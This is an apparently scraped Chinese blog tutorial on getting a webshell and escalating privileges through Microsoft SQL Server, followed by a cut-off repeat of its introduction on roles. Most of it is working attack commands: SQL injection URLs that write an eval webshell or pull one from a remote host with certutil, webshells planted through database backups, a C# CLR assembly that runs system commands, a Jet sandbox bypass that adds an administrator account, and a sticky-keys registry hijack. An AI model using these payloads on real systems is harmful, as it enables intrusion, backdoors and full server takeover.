Server并不参与验证。SQL Server完全相信Windows的验证结果，所以用此方式登录SQL Server时并不需要提供密码。 SQL Server和Windows身份验证模式：这种模式即允许由Windows来验证主体身份，又允许SQL Server来验证主体身份，当由SQL Server验证主体身份时，需要用户名和密码来确认主体身份，和使用什么Windows账户半毛钱关系都没有，是在服务器上创建的另外一种独立账号。  getshell 能否getshell要看你当前的用户权限，如果是没有进行降权的sa用户，那么你几乎可以做任何事。当然你如果有其他具有do_owner权限的用户也可以。\n拿shell的两大前提就是\n 有相应的权限db_owner 知道web目录的绝对路径  我们先来了解下怎么去寻找web目录的绝对路径。\n寻找绝对路径  报错信息 字典猜 旁站的目录 存储过程来搜索 读配置文件  前三种方法都是比较常见的方法。我们主要来讲第四种调用存储过程来搜索。\n先来看xp_dirtree直接举例子\nexecute master..xp_dirtree 'c:' --列出所有c:\\文件、目录、子目录 execute master..xp_dirtree 'c:',1 --只列c:\\目录\rexecute master..xp_dirtree 'c:',1,1 --列c:\\目录、文件\r 当实际利用的时候我们可以创建一个临时表把存储过程查询到的路径插入到临时表中，这样只需要去读取tmp表中的数据即可\nCREATE TABLE tmp (dir varchar(8000),num int,num1 int);\rinsert into tmp(dir,num,num1) execute master..xp_dirtree 'C:\\Users\\Administrator\\Desktop',1,1;\r 测试完成后记得删除tmp表\ndrop table tmp\r 我们再来看xp_cmdshell怎么去找绝对路径，实际上原理就是调用cmd来查找文件（如果可以执行命令，可以通过远程下载文件的方式下载木马）\nhttp://127.0.0.1/1.aspx?id=1;CREATE TABLE cmdtmp (dir varchar(8000));\rhttp://127.0.0.1/1.aspx?id=1;insert into cmdtmp(dir) exec master..xp_cmdshell 'for /r c:\\ %i in (1*.aspx) do @echo %i'\r xp_cmdshell拿shell xp_cmdshell这个存储过程可以用来执行cmd命令，那么我们可以通过cmd的echo命令来写入shell，当然前提是你知道web目录的绝对路径\nhttp://192.168.130.137/1.aspx?id=1;exec master..xp_cmdshell 'echo ^\u0026lt;%@ Page Language=\u0026quot;Jscript\u0026quot;%^\u0026gt;^\u0026lt;%eval(Request.Item[\u0026quot;pass\u0026quot;],\u0026quot;unsafe\u0026quot;);%^\u0026gt; \u0026gt; c:\\\\WWW\\\\404.aspx' ;\r 由于cmd写webshell的主意这些转义的问题(所有的尖括号需要转义) 推荐使用certutil下载\n远程下载文件\rcertutil -urlcache -split -f \u0026quot;http://172.20.10.4:8000/xxx.aspx\u0026quot; \u0026quot;c:\\wwwroot\\asp\\nice.aspx\u0026quot;\r命令：\rhttp://192.168.130.137/1.aspx?id=1;exec master..xp_cmdshell 'certutil -urlcache -split -f \u0026quot;http://172.20.10.4:8000/xxx.aspx\u0026quot; \u0026quot;c:\\wwwroot\\asp\\nice.aspx\u0026quot;' ;\r#加密\rcertutil -encode test.aspx out.txt\r解密\rcertutil -decode c:\\windows\\Temp\\out.txt c:\\wwwroot\\asp\\aspx.aspx\r1.首先在本地使用certutil加密，将加密后的内容复制出来\recho PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLA== \u0026gt; C:\\tmp\\shell.txt\r2.解密\rcertutil -f -decode \u0026quot;C:\\tmp\\shell.txt\u0026quot; \u0026quot;C:\\tmp\\shell.jsp\u0026quot;\r使用certutil下载文件有个弊端就是会产生缓存文件，用如下命令查看：\rcertutil -urlcache *\r执行删除缓存\rcertutil -urlcache * delete\r 差异备份拿shell backup database 库名 to disk = 'c:\\bak.bak';--\rcreate table [dbo].[test] ([cmd] [image]);\rinsert into test(cmd) values(0x3C25657865637574652872657175657374282261222929253E) （将webshell转成16进制）\rbackup database 库名 to disk='C:\\d.asp' WITH DIFFERENTIAL,FORMAT;--\r log备份拿shell LOG备份的要求是他的数据库备份过，而且选择恢复模式得是完整模式，至少在2008上是这样的，但是使用log备份文件会小的多，当然如果你的权限够高可以设置他的恢复模式\nalter database 库名 set RECOVERY FULL create table cmd (a image) backup log 库名 to disk = 'c:\\xxx' with init insert into cmd (a) values (0x3C25657865637574652872657175657374282261222929253E) （将webshell转成16进制）\rbackup log 库名 to disk = 'c:\\xxx\\2.asp'\r log备份的好处就是备份出来的webshell的文件大小非常的小\n提权 xpcmdshell提权  xp_cmdshell默认在mssql2000中是开启的，在mssql2005之后默认禁止，但未删除\n 0x01 xp_cmdshell简介 xp``_cmdshell是Sql Server中的一个组件，将命令字符串作为操作系统命令 shell 执行，并以文本行的形式返回所有输出。通常在拿到sa口令之后，可以通过xp``_cmdshell来进行提权\n影响范围：\n只要该数据库存在该组件，就可以利用\n0x02 xp_cmdshell使用 1. 查看xp_cmdshell状态 判断xpcmdshell权限\ndeclare @RunningOnACluster char(1)\rdeclare @xp_cmdshell_available char(1)\rdeclare @result int set @xp_cmdshell_available='Y' set @result=0\rselect @RunningOnACluster=case when convert(int, serverproperty('IsClustered')) = 1 then 'Y'\relse 'N' end if(0=(select value_in_use from sys.configurations where name='xp_cmdshell'))\rset @xp_cmdshell_available='N' if @RunningOnACluster='Y' begin\rif @xp_cmdshell_available='Y'\rselect @result=1\rif @xp_cmdshell_available='N'\rselect @result=2\rend\rselect @result\r 返回1表示xp_cmdshell组件启用，返回0则表示未启用。\n恢复xp_cmdshell存储过程\n解决Error Message:未能找到存储过程 ‘master..xp_cmdshell’。\r第一步先删除：\rdrop procedure sp_addextendedproc\rdrop procedure sp_oacreate\rexec sp_dropextendedproc 'xp_cmdshell'\r第二步恢复：\rdbcc addextendedproc(\u0026quot;sp_oacreate\u0026quot;,\u0026quot;odsole70.dll\u0026quot;)\rdbcc addextendedproc(\u0026quot;xp_cmdshell\u0026quot;,\u0026quot; \u0026quot;)\r直接恢复，不管sp_addextendedproc是不是存在，需要自行上传xplog70.dll，恢复扩展存储过过程xp_cmdshell的语句:\rdbcc addextendedproc(\u0026quot;xp_cmdshell\u0026quot;,\u0026quot;xplog70.dll\u0026quot;)\r代码判断一系列存储过程是否存在，若不存在则恢复。\rif not exists (select * from dbo.sysobjects where id = object_id(N'[dbo].[xp_cmdshell]'))\rdbcc addextendedproc ('xp_cmdshell','xplog70.dll')\rif not exists (select * from dbo.sysobjects where id = object_id(N'[dbo].[xp_dirtree]'))\rdbcc addextendedproc ('xp_dirtree','xpstar.dll')\rif not exists (select * from dbo.sysobjects where id = object_id(N'[dbo].[xp_fixeddrives]'))\rdbcc addextendedproc ('xp_fixeddrives','xpstar.dll')\rif not exists (select * from dbo.sysobjects where id = object_id(N'[dbo].[xp_regwrite]'))\rdbcc addextendedproc ('xp_regwrite','xpstar.dll')\rif not exists (select * from dbo.sysobjects where id = object_id(N'[dbo].[xp_regread]'))\rdbcc addextendedproc ('xp_regread','xpstar.dll')\r 2.开启xp_cmdshell存储过程 EXEC sp_configure 'show advanced options', 1; RECONFIGURE; exec SP_CONFIGURE 'xp_cmdshell', 1; RECONFIGURE;\r 3.xp_cmdshell执行系统命令 xp_cmdshell执行whoami命令\nexec master.dbo.xp_cmdshell 'whoami'\rexec master.dbo.xp_cmdshell \u0026quot;whoami\u0026quot;\rexec xp_cmdshell \u0026quot;whoami\u0026quot;;\r 4.关闭xp_cmdshell存储过程 关闭xp_cmdshell配置\nEXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 0;RECONFIGURE;\r 删除xp_cmdshell的语句:\nexec sp_dropextendedproc 'xp_cmdshell';\r 删除xp_cmdshell过程，再添加xp_cmdshell过程，需要自行上传xplog70.dll恢复被删除的xp_cmdshell。\ndrop procedure xp_cmdshell;\rexec sp_addextendedproc \u0026quot;xp_cmdshell\u0026quot;, \u0026quot;xplog70.dll\u0026quot;;\r 附录\nexec sp_addextendedproc xp_cmdshell ,@dllname ='xplog70.dll'\rexec sp_addextendedproc xp_enumgroups ,@dllname ='xplog70.dll'\rexec sp_addextendedproc xp_loginconfig ,@dllname ='xplog70.dll'\rexec sp_addextendedproc xp_enumerrorlogs ,@dllname ='xpstar.dll'\rexec sp_addextendedproc xp_getfiledetails ,@dllname ='xpstar.dll'\rexec sp_addextendedproc Sp_OACreate ,@dllname ='odsole70.dll'\rexec sp_addextendedproc Sp_OADestroy ,@dllname ='odsole70.dll'\rexec sp_addextendedproc Sp_OAGetErrorInfo ,@dllname ='odsole70.dll'\rexec sp_addextendedproc Sp_OAGetProperty ,@dllname ='odsole70.dll'\rexec sp_addextendedproc Sp_OAMethod ,@dllname ='odsole70.dll'\rexec sp_addextendedproc Sp_OASetProperty ,@dllname ='odsole70.dll'\rexec sp_addextendedproc Sp_OAStop ,@dllname ='odsole70.dll'\rexec sp_addextendedproc xp_regaddmultistring ,@dllname ='xpstar.dll'\rexec sp_addextendedproc xp_regdeletekey ,@dllname ='xpstar.dll'\rexec sp_addextendedproc xp_regdeletevalue ,@dllname ='xpstar.dll'\rexec sp_addextendedproc xp_regenumvalues ,@dllname ='xpstar.dll'\rexec sp_addextendedproc xp_regremovemultistring ,@dllname ='xpstar.dll'\rexec sp_addextendedproc xp_regwrite ,@dllname ='xpstar.dll'\rexec sp_addextendedproc xp_dirtree ,@dllname ='xpstar.dll'\rexec sp_addextendedproc xp_regread ,@dllname ='xpstar.dll'\rexec sp_addextendedproc xp_fixeddrives ,@dllname ='xpstar.dll'\r 简单总结：\nxp_cmdshell默认在mssql2000中是开启的，在mssql2005之后的版本中则默认禁止。如果用户拥有管理员sa权限则可以用sp_configure重新开启它。\r启用：\rEXEC sp_configure 'show advanced options', 1\rRECONFIGURE;\rEXEC sp_configure 'xp_cmdshell', 1;\rRECONFIGURE;\r关闭：\rexec sp_configure 'show advanced options', 1;\rreconfigure;\rexec sp_configure 'xp_cmdshell', 0;\rreconfigure;\r删除：\rexec sp_dropextendedproc 'xp_cmdshell';\r执行：\rEXEC master.dbo.xp_cmdshell '命令'\r如果xp_cmdshell被删除了，可以上传xplog70.dll进行恢复\rexec master.sys.sp_addextendedproc 'xp_cmdshell', 'C:\\Program Files\\Microsoft SQL Server\\MSSQL\\Binn\\xplog70.dll'\r SP_OACREATE 0x01 sp_oacreate简介  调用wscript.shel执行命令\n sp_oacreate系统存储过程可以用于对文件删除、复制、移动等操作，还可以配合sp_oamethod系统存储过程调用系统wscript.shell来执行系统命令。sp_oacreate和sp_oamethod两个过程分别用来创建和执行脚本语言。\n系统管理员使用sp_configure启用sp_oacreate和sp_oamethod系统存储过程对OLE自动化过程的访问（OLE Automation Procedures）\n在效果方面，sp_oacreate、sp_oamethod两个过程和xp_cmdshell过程功能类似，因此可以替换使用！\n利用条件：\n 1.已获取到sqlserver sysadmin权限用户的账号与密码且未降权（如2019版本sa用户权限为mssqlserver，已降权）\n2.sqlserver允许远程连接\n3.OLE Automation Procedures选项开启\n 0x02 sp_oacreate使用 1.查看SP_OACREATE状态 我们可以在master.dbo.sysobjects中查看SP_OACREATE状态\nselect * from master.dbo.sysobjects where xtype='x' and name='SP_OACREATE'\r 2.判断SP_OACREATE是否存在 select count(*) from master.dbo.sysobjects where xtype='x' and name='SP_OACREATE'\r 利用count(*)判断是否存在，存在即返回1。\n3.启用SP_OACREATE 利用sp_configure存储过程，启用SP_OACREATE\nexec sp_configure 'show advanced options', 1; RECONFIGURE WITH OVERRIDE; exec sp_configure 'Ole Automation Procedures', 1; RECONFIGURE WITH OVERRIDE;\r 4.利用SP_OACREATE执行命令 利用SP_OACREATE执行系统命令\ndeclare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'C:\\Windows\\System32\\cmd.exe /c whoami /all \u0026gt;C:\\\\test\\test.txt'\r 此利用方法无回显\n5.关闭组件命令 exec sp_configure 'show advanced options',1;\rreconfigure;\rexec sp_configure 'Ole Automation Procedures',0;\rreconfigure;\r 简单总结\n判断SP_OACREATE是否存在\rselect count(*) from master.dbo.sysobjects where xtype='x' and name='SP_OACREATE'\r启用：\rEXEC sp_configure 'show advanced options', 1; RECONFIGURE WITH OVERRIDE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE WITH OVERRIDE; 关闭：\rEXEC sp_configure 'show advanced options', 1;\rRECONFIGURE WITH OVERRIDE; EXEC sp_configure 'Ole Automation Procedures', 0; RECONFIGURE WITH OVERRIDE; 执行：\rdeclare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'C:\\Windows\\System32\\cmd.exe /c whoami /all \u0026gt;C:\\\\test\\test.txt'\r以上是使用sp_oacreate的提权语句，主要是用来调用OLE对象（Object Linking and Embedding的缩写，VB中的OLE对象），利用OLE对象的run方法执行系统命令。\r CLR提权 0x01 CLR简介 CLR微软官方把他称为公共语言运行时，从 SQL Server 2005 (9.x) 开始，SQL Server 集成了用于 Microsoft Windows 的 .NET Framework 的公共语言运行时 (CLR) 组件。 这意味着现在可以使用任何 .NET Framework 语言（包括 Microsoft Visual Basic .NET 和 Microsoft Visual C#）来编写存储过程、触发器、用户定义类型、用户定义函数、用户定义聚合和流式表值函数。\n更多概念详见下方官方链接：\nhttps://docs.microsoft.com/zh-cn/sql/relational-databases/clr-integration/common-language-runtime-clr-integration-programming-concepts?view=sql-server-ver15\n0x02 编写CLR 利用VS创建MSSQL数据库项目\n修改目标平台和勾选创建脚本\n在SQL Server 2005中引入了从MSSQL运行.NET代码的功能，并在后续版本中叠加了许多保护措施，来限制代码可以访问的内容。在创建.Net程序集时，会给它们指定一个权限级别，例如：\nCREATE ASSEMBLY SQLCLRTest FROM 'C:\\MyDBApp\\SQLCLRTest.dll' WITH PERMISSION_SET = SAFE;\r 其权限集有三个选项：\nSAFE：基本上只将MSSQL数据集暴露给代码，其他大部分操作则都被禁止。\nEXTERNAL_ACCESS：允许访问底层服务器上某些资源，但不应该允许直接执行代码。\nUNSAFE：允许使用任何代码。\n微软关于SQL CLR的详细文档可通过以下地址获得： https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration\n根据不同的数据库选择不同的.net，修改目标框架和权限级别为UNSAFE。\n创建SQL CLR C# 存储过程\n写入代码\nusing System;\rusing System.Data;\rusing System.Data.SqlClient;\rusing System.Data.SqlTypes;\rusing System.Diagnostics;\rusing System.Text;\rusing Microsoft.SqlServer.Server;\rpublic partial class StoredProcedures\r{\r[Microsoft.SqlServer.Server.SqlProcedure]\rpublic static void ExecCommand (string cmd)\r{\r// 在此处放置代码\rSqlContext.Pipe.Send(\u0026quot;Command is running, please wait.\u0026quot;);\rSqlContext.Pipe.Send(RunCommand(\u0026quot;cmd.exe\u0026quot;, \u0026quot; /c \u0026quot; + cmd));\r}\rpublic static string RunCommand(string filename,string arguments)\r{\rvar process = new Process();\rprocess.StartInfo.FileName = filename;\rif (!string.IsNullOrEmpty(arguments))\r{\rprocess.StartInfo.Arguments = arguments;\r}\rprocess.StartInfo.CreateNoWindow = true;\rprocess.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;\rprocess.StartInfo.UseShellExecute = false;\rprocess.StartInfo.RedirectStandardError = true;\rprocess.StartInfo.RedirectStandardOutput = true;\rvar stdOutput = new StringBuilder();\rprocess.OutputDataReceived += (sender, args) =\u0026gt; stdOutput.AppendLine(args.Data);\rstring stdError = null;\rtry\r{\rprocess.Start();\rprocess.BeginOutputReadLine();\rstdError = process.StandardError.ReadToEnd();\rprocess.WaitForExit();\r}\rcatch (Exception e)\r{\rSqlContext.Pipe.Send(e.Message);\r}\rif (process.ExitCode == 0)\r{\rSqlContext.Pipe.Send(stdOutput.ToString());\r}\relse\r{\rvar message = new StringBuilder();\rif (!string.IsNullOrEmpty(stdError))\r{\rmessage.AppendLine(stdError);\r}\rif (stdOutput.Length != 0)\r{\rmessage.AppendLine(\u0026quot;Std output:\u0026quot;);\rmessage.AppendLine(stdOutput.ToString());\r}\rSqlContext.Pipe.Send(filename + arguments + \u0026quot; finished with exit code = \u0026quot; + process.ExitCode + \u0026quot;: \u0026quot; + message);\r}\rreturn stdOutput.ToString();\r}\r}\r 编译成功后\n将以下文件保存为dll.ps1(需要修改dll路径)\n$assemblyFile = \u0026quot;C:\\Users\\Administrator\\Desktop\\dll\\sysinfo.dll\u0026quot;\r$stringBuilder = New-Object -Type System.Text.StringBuilder\r$stringBuilder.AppendLine(\u0026quot;use msdb;\u0026quot;) | Out-Null\r$stringBuilder.AppendLine(\u0026quot;alter database master set trustworthy on;\u0026quot;) | Out-Null\r$stringBuilder.AppendLine(\u0026quot;exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'clr enabled',1;reconfigure;\u0026quot;) | Out-Null\r$stringBuilder.Append(\u0026quot;CREATE ASSEMBLY [sysinfo] AUTHORIZATION [dbo] FROM `n0x\u0026quot;) | Out-Null\r$fileStream = [IO.File]::OpenRead($assemblyFile) while (($byte = $fileStream.ReadByte()) -gt -1) { $stringBuilder.Append($byte.ToString(\u0026quot;X2\u0026quot;)) | Out-Null }\r$stringBuilder.AppendLine(\u0026quot;`n WITH PERMISSION_SET = UNSAFE;\u0026quot;) | Out-Null\r$stringBuilder.AppendLine(\u0026quot; \u0026quot;) | Out-Null\r$stringBuilder.AppendLine(\u0026quot;CREATE PROCEDURE [dbo].[ExecCommand] @cmd NVARCHAR (MAX) AS EXTERNAL NAME [sysinfo].[StoredProcedures].[ExecCommand]\u0026quot;) | Out-Null\r$stringBuilder.AppendLine(\u0026quot; \u0026quot;) | Out-Null\r$stringBuilder.AppendLine(\u0026quot;exec dbo.ExecCommand 'whoami /all';\u0026quot;) | Out-Null $stringBuilder.AppendLine(\u0026quot; \u0026quot;) | Out-Null\r$stringBuilder.ToString() -join \u0026quot;\u0026quot; | Out-File C:\\Users\\Administrator\\Desktop\\dll\\exec.txt\r 输入以下命令，生成提权用到的命令，运行完成后在当前目录生成exec.txt文件（该脚本用于生成提权语句，将dll转成16进制，通过这种方式文件不落地。）\npwershell -exec bypass ./dll.ps1\r 打开可看到提权SQL语句，分别运行每一条SQL语句\n进入msdb数据库\nuse msdb;\r 0x03 将存储.Net程序集的数据库配置为可信赖的。 alter database master set trustworthy on;\r 0x04 启用MSSQL CLR功能 exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'clr enabled',1;reconfigure;\r命令解释：\rexec sp_configure 'show advanced options',1; #显示高级选项：\rreconfigure; #重新配置\rexec sp_configure 'clr enabled',1; # 开启clr enabled 选项\rreconfigure; #重新配置\r--关闭所有服务器配置选项\rEXEC sp_configure N'show advanced options', N'0' RECONFIGURE WITH OVERRIDE\r--如果存在权限问题，执行下面一段脚本\ralter database [master] set TRUSTWORTHY on\rEXEC sp_changedbowner 'sa'\r 0x05 利用SQL语句导入程序集 CREATE ASSEMBLY [Database1]\rAUTHORIZATION [dbo]\rFROM 0x0000\rWITH PERMISSION_SET = UNSAFE;\rGO\r 0x06 创建存储过程 CREATE PROCEDURE [dbo].[ExecCommand] @cmd NVARCHAR (MAX) AS EXTERNAL NAME [sysinfo].[StoredProcedures].[ExecCommand]\r 0x07 执行命令 执行系统命令，查看当前的权限\nexec dbo.ExecCommand 'whoami';\r 沙盒提权 什么是沙盒？\n沙盒（英语：sandbox，又译为沙箱），计算机专业术语，在计算机安全领域中是一种安全机制，为运行中的程序提供的隔离环境。通常是作为一些来源不可信、具破坏力或无法判定程序意图的程序提供实验之用。\n利用前提：\n 1.需要Microsoft.Jet.OLEDB.4.0一般在32位系统才可以，64位机需要12.0，较复杂\n2.dnary.mdb和ias.mdb两个文件 在win2003上默认存在，也可自行准备\n 提权操作\n简单总结\n--提权语句\rexec sp_configure 'show advanced options',1;reconfigure;\r-- 不开启的话在执行xp_regwrite会提示让我们开启，\rexec sp_configure 'Ad Hoc Distributed Queries',1;reconfigure;\r--关闭沙盒模式，如果一次执行全部代码有问题，先执行上面两句代码。\rexec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\Jet\\4.0\\Engines','SandBoxMode','REG_DWORD',0;\r--查询是否正常关闭，经过测试发现沙盒模式无论是开，还是关，都不会影响我们执行下面的语句。\rexec master.dbo.xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\Jet\\4.0\\Engines', 'SandBoxMode'\r--执行系统命令select * from openrowset('microsoft.jet.oledb.4.0',';database=c:/windows/system32/ias/ias.mdb','select shell(\u0026quot;net user margin margin /add\u0026quot;)')\rselect * from openrowset('microsoft.jet.oledb.4.0',';database=c:/windows/system32/ias/ias.mdb','select shell(\u0026quot;net localgroup administrators margin /add\u0026quot;)')\r沙盒模式SandBoxMode参数含义（默认是2）\r`0`：在任何所有者中禁止启用安全模式\r`1` ：为仅在允许范围内\r`2` ：必须在access模式下\r`3`：完全开启\ropenrowset是可以通过OLE DB访问SQL Server数据库，OLE DB是应用程序链接到SQL Server的的驱动程序。\r--恢复配置\r--exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\Jet\\4.0\\Engines','SandBoxMode','REG_DWORD',1;\r--exec sp_configure 'Ad Hoc Distributed Queries',0;reconfigure;\r--exec sp_configure 'show advanced options',0;reconfigure;\r 引用前辈们的话\n 1，Access可以调用VBS的函数，以System权限执行任意命令 2，Access执行这个命令是有条件的，需要一个开关被打开 3，这个开关在注册表里 4，SA是有权限写注册表的 5，用SA写注册表的权限打开那个开关 6，调用Access里的执行命令方法，以system权限执行任意命令执行SQL命令，执行了以下命令\n 利用镜像劫持提权 0x01 简介 通过使用xp_regwrite存储过程对注册表进行修改，替换成任意值，造成镜像劫持。\n前提条件：\n 1.未禁止注册表编辑（即写入功能）\n2.xp_regwrite启用\n 0x02 映像劫持提权 1.查看xp_regwrite是否启用 select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_regwrite'\r 返回1表示xp_regwrite组件启用 返回0则表示未启用\n2.xp_regwrite开启与关闭 EXEC sp_configure 'show advanced options', 1\rRECONFIGURE\rEXEC sp_configure 'xp_regwrite',1\rRECONFIGURE\r 3.利用regwrite函数修改组注册表进行劫持 首先我们利用regwrite函数修改组册表进行劫持，这里如果regwrite执行失败参考上面的开启方法。\nEXEC master..xp_regwrite @rootkey='HKEY_LOCAL_MACHINE',@key='SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.EXE',@value_name='Debugger',@type='REG_SZ',@value='c:\\windows\\system32\\cmd.exe'\r 4.查看是否劫持成功 exec master..xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe','Debugger'\r 5.验证是否成功 紧接着我们远程连接桌面，然后连续按5次shift就可以调用cmd窗口\n拓展：\n上面对只是对粘滞键进行修改，类似的，可以在注册表中进行其他操作\n6.删除指定注册表键值 删除粘滞键的键值\nxp_regdeletekey 'HKEY_LOCAL_MACHINE', 'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe'\r 利用Agent Job执行命令 0x01 简介 SQL Server代理是一项Microsoft Windows服务，它执行计划的管理任务，这些任务在SQL Server 2019（15.x）中称为作业。\n原理：创建一个任务并执行命令，命令执行后的结果，将结果写入文件中。\nJob执行命令 1.启动sqlagent服务 首先需要启动sqlagent服务：\nexec master.dbo.xp_servicecontrol 'start','SQLSERVERAGENT'\r 2.进入数据库 USE msdb;  3.定义创建作业 EXEC dbo.sp_add_job @job_name = N'test_powershell_job1';  4.定义作业步骤 定义作业步骤(作业中查看当前用户并将用户写入c:\\1.txt文件中)\nEXEC sp_add_jobstep @job_name = N'test_powershell_job1', @step_name = N'test_powershell_name1', @subsystem = N'PowerShell', @command = N'c:\\windows\\system32\\cmd.exe /c whoami \u0026gt;c:\\\\1.txt', @retry_attempts = 1, @retry_interval = 5 ;EXEC dbo.sp_add_jobserver @job_name = N'test_powershell_job1';  5.启动作业 启动作业（启动作业需要一点时间，作业完成后会在c盘目录下新建），如果命令没有执行成功多运行几次即可。\nEXEC dbo.sp_start_job N'test_powershell_job1';\r 6.验证是否成功 参考地址：\nhttps://www.freebuf.com/vuls/276814.html\rhttps://y4er.com/post/mssql-getshell/\rhttps://f5.pm/go-26046.html\rhttp://alexsel.com/index.php/archives/80/\rhttps://xz.aliyun.com/t/9475\r ","id":17,"section":"posts","summary":"一、MSSQL简介 MSSQL(MicroSoft SQL Server数据库)，是微软开发的关系型数据库管理系统DBMS，是一个较大型的数据库，提供数据库的从服务器到终端的完整","tags":["MSSQL","内网渗透"],"title":"MSSQL获取shell和提权","uri":"https://ad-calcium.github.io/2021/07/mssql%E6%8F%90%E6%9D%83/","year":"2021"},{"content":"一、MSSQL简介 MSSQL(MicroSoft SQL Server数据库)，是微软开发的关系型数据库管理系统DBMS，是一个较大型的数据库，提供数据库的从服务器到终端的完整的解决方案，数据库管理系统SSMS(SQL Server Managerment Studio)，是一个用于建立、使用和维护数据库的集成开发环境。 端口号：1433\nSA用户 在搭建时，选择使用SQL Server身份验证会创建SA账户并设置密码，SA(System Administrator)表示系统管理员，在SQLServer2019之前的SA用户都是系统最高权限用户SYSTEM，但在2019版本时为普通数据库用户mssqlserver，是一个低权用户。\n系统库 系统数据库默认创建时就会存在，有以下4种\n存储过程 存储过程是一个可编程的函数，它在数据库中创建并保存，是存储在服务器中的一组预编译过的T-SQL（SQL语言版本之一，只能在SQLserver使用）语句。数据库中的存储过程可以看做是对编程中面向对象方法的模拟。它允许控制数据的访问方式（可以将存储过程理解为函数调用的过程），使用execute命令执行存储过程。\n系统存储过程、扩展存储过程、用户自定义的存储过程。\n 系统存储过程主要存储在master数据库中，以\u0026quot;sp_\u0026ldquo;为前缀，在任何数据库中都可以调用，在调用的时候不必在存储过程前加上数据库名； 扩展存储过程则是对动态链接库(DLL)函数的调用，主要是用于客户端与服务器端或客户端之间进行通信的，以“xp_\u0026ldquo;为前缀，使用方法与系统存储过程类似； 用户定义的存储过程是SQLServer的使用者编写的存储过程；  存储过程为数据库提供了强大的功能，但在相应的权限下，攻击者可以利用不同的存储过程执行不同的高级功能，如：创建数据库用户、枚举文件目录、执行任意系统命令等。正因如此，SQLserver2005、2008等之后的版本分别对存储过程做了权限控制，以防滥用。\nServer权限体系 权限两个字，一个权力，一个限制。在软件领域通俗的解释就是哪些人可以对哪些资源做哪些操作。在SQL Server中，”哪些人”，“哪些资源”,”哪些操作”则分别对应SQL Server中的三个对象，分别为主体(Principals),安全对象(Securables)和权限(Permissions)，而权力和限制则是对应了SQL Server中的GRENT和DENY。对于主体，安全对象和权限的初步理解，见下图：\n主体 “主体”是可以请求 SQL Server 资源的实体。主体可以是个体，组或者进程。主体可以按照作用范围被分为三类:\n Windows级别主体：包括Windows 域登录名和Windows 本地登录名。 服务器级别主体：包括服务器登录名和服务器角色。 数据库级别主体：包括数据库用户、数据库角色、固定数据库角色以及应用程序角色。  可以看到主体包括登录名以及角色。\n角色 角色可以看成是权限的集合体，为了方便权限管理，可以把一些常用权限赋予角色，然后再把角色赋予相关用户，则这些用户就继承了橘色中的所有权限。一般情况下，数据库会内置一些角色，用户也可以创建自定义角色。对角色进行权限管理的方式与对用户进行权限管理的方式是相同的。 角色在SQL Server中被分为三类，分别为:\n 内置角色\u0026mdash;-这类角色在服务器安装时已经默认存在，其权限是固定的，并且不能被删除 用户自定义角色\u0026mdash;-这类角色由用户按照需求自定义创建 应用程序角色\u0026mdash;-这类特殊角色用于管理应用程序的数据访问  角色也分为两个方面：\n 服务器级别的角色，用于数据库服务器方面的控制权限 数据库级别的角色，用于数据库中数据的控制权限。  1.服务器级别的角色 服务器级角色的权限作用域为服务器范围。例如创建、修改、删除数据库，管理磁盘文件，添加或删除数据库连接等等，都是需要服务器上的权限才能进行操作。 固定服务器角色具有一组固定的权限，并且适用于整个服务器范围。 它们专门用于管理 SQL Server，且不能更改分配给它们的权限。 可以在数据库中不存在用户帐户的情况下向固定服务器角色分配登录。 **服务器级别的对象，只能包含登录名。**定义了服务器角色，你定义的登陆用户就有了相应的执行权限。先来看一下服务器级别的固定角色：\n   服务器角色 含义     sysadmin 可以在服务器上执行任何活动   serveradmin 可以更改服务器范围的配置选项和关闭服务器   securityadmin 管理和审核登录用户。具有 GRANT、DENY 和 REVOKE 服务器和数据库级别的权限。此外，还可以重置 SQL Server 登录名的密码   processadmin 管理SQL Server运行的进程   setupadmin 可以使用 T-SQL 语句添加和删除连接服务器，并可以执行某些系统存储过程（如 sp_serveroption）   bulkadmin 可以运行 BULK INSERT 语句   diskadmin 用于管理磁盘文件   dbcreator 可以创建、更改、删除和还原任何数据库   public public角色不同于其它角色在于其权限可以被修改，每个 SQL Server 登录名都属于 public 服务器角色。无法将用户、角色或组指派给它，因为默认情况下它属于该角色，且public不能被删除    2.数据库级别的角色 数据库级角色的权限作用域为数据库范围。例如可以访问哪个数据库，可以访问哪个数据库中的哪些数据表、哪些视图、哪些存储过程等等，都需要数据库上的权限才能进行操作。 SQL Server存在两种类型的数据库级角色：数据库中预定义的“固定数据库角色”和可以创建的“用户定义的数据库角色”。 固定数据库角色是SQL Server预定义的数据库角色，具有数据库级别的管理权限，并且存在于每个数据库中。**db_owner *数据库角色的成员可以管理固定数据库角色成员身份。自定义数据库角色是当固定数据库角色不能满足要求时，可以自定义数据库角色。 * 数据库级别的对象，只能包含数据库用户名。**先来看一下数据库级别的固定角色：\n   数据库角色 含义     db_owner 可以执行数据库中技术所有动作的用户，执行所有的配置活动和维护活动   db_securityadmin 管理数据库安全，可以修改角色成员身份和管理权限。向此角色中添加主体可能会导致意外的权限升级   db_accessadmin 可以为 Windows 登录名、Windows 组和 SQL Server 登录名添加或删除数据库访问权限   db_backupoperator 可以备份数据库   db_ddladmin 可以在数据库中运行任何数据定义语言 (DDL) 命令   db_datawriter 可以在所有用户表中添加、删除或更改数据   db_datareader 可以从所有用户表中读取所有数据   db_denydatawriter 不能添加、修改或删除数据库内用户表中的任何数据   db_denydatareader 